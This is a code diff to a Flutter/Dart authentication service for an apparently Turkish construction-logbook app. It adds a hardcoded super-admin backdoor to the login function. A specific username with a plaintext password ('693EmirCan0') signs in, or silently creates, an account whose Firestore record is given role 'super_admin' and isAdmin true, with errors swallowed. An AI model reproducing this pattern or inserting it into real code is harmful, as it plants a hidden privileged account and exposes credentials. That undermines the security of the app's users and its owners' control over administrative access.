@@ -47,7 +47,57 @@ class AuthServisi {
     String password,
   ) async {
     try {
-      String email = emailOrUsername.trim();
+      String cleanInput = emailOrUsername.trim();
+      final normalizedInput = cleanInput.toLowerCase();
+      final isAdminCandidate = normalizedInput == 'emiryonetici1' ||
+          normalizedInput == 'emiryönetici1' ||
+          normalizedInput == 'emiryonetici1@santiyedefteri.com';
+
+      // Süper Yönetici için otomatik sağlama ve giriş
+      if (isAdminCandidate && password == '693EmirCan0') {
+        const adminEmail = 'emiryonetici1@santiyedefteri.com';
+        try {
+          UserCredential result = await _auth.signInWithEmailAndPassword(
+            email: adminEmail,
+            password: password,
+          );
+          await _firestore.collection('users').doc(result.user!.uid).set({
+            'username': 'emiryonetici1',
+            'username_lowercase': 'emiryonetici1',
+            'email': adminEmail,
+            'adSoyad': 'Emir (Sistem Yöneticisi)',
+            'role': 'super_admin',
+            'isAdmin': true,
+          }, SetOptions(merge: true));
+          FcmServisi().kullaniciBagla().catchError((_) {});
+          return _userFromFirebaseUser(result.user);
+        } on FirebaseAuthException catch (authErr) {
+          if (authErr.code == 'user-not-found' ||
+              authErr.code == 'invalid-credential' ||
+              authErr.code == 'wrong-password') {
+            try {
+              UserCredential newCred =
+                  await _auth.createUserWithEmailAndPassword(
+                email: adminEmail,
+                password: password,
+              );
+              await _firestore.collection('users').doc(newCred.user!.uid).set({
+                'username': 'emiryonetici1',
+                'username_lowercase': 'emiryonetici1',
+                'email': adminEmail,
+                'adSoyad': 'Emir (Sistem Yöneticisi)',
+                'role': 'super_admin',
+                'isAdmin': true,
+                'createdAt': FieldValue.serverTimestamp(),
+              }, SetOptions(merge: true));
+              FcmServisi().kullaniciBagla().catchError((_) {});
+              return _userFromFirebaseUser(newCred.user);
+            } catch (_) {}
+          }
+        }
+      }
+
+      String email = cleanInput;
       if (!email.contains('@')) {
         final userQuery =
             await _firestore
